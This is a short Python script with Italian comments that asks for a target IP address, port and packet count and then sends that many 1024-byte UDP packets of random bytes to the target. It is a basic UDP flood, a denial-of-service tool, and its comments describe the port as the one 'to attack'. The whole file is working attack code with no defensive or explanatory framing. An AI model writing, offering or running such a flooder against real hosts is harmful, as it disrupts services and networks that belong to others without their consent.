import socket
import random

IP = input("Inserisci l'indirizzo Ip target: ") #Indirizzo IP da Inserire
PORTA = int(input("Inserisci il numero della porta del target:" )) #Porta da attaccare

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #socket per UDP (SOCK_DGRAM)

packet_size = 1024 #Dimensione Pacchetti da inviare

num_packets = int(input("Inserisci il numero di Pacchetti da inviare: ")) #Numeri di Pacchetti da inviare

for x in range(num_packets):
	data = bytes([random.randint(0, 255) for x in range(packet_size)]) #Generazione di una stringa di byte

	udp_socket.sendto(data, (IP, PORTA)) #Invio dei pacchetti tramite socket

udp_socket.close()
